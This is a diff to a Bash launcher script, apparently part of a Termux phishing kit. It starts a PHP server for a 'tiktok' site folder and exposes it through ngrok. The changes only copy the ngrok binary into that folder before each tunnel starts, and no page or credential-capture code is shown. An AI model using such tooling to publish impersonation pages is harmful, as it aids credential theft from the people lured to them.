@@ -65,10 +65,15 @@ echo ""
                            cd tiktok/
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+			   
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 3
                            echo ""
                            echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+			    cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+			   
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            echo ""
@@ -89,6 +94,10 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -110,6 +119,11 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		  cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -176,6 +190,10 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -245,6 +263,11 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -266,6 +289,11 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -286,6 +314,10 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -305,6 +337,11 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -426,6 +463,10 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
+		  
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
@@ -486,6 +527,10 @@ echo ""
                   sleep 3
                   echo ""
                   echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+		  
+		   cd $HOME
+                           cp  ngrok /data/data/com.termux/files/home/sites/tiktok
+                           cd /data/data/com.termux/files/home/sites/tiktok
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
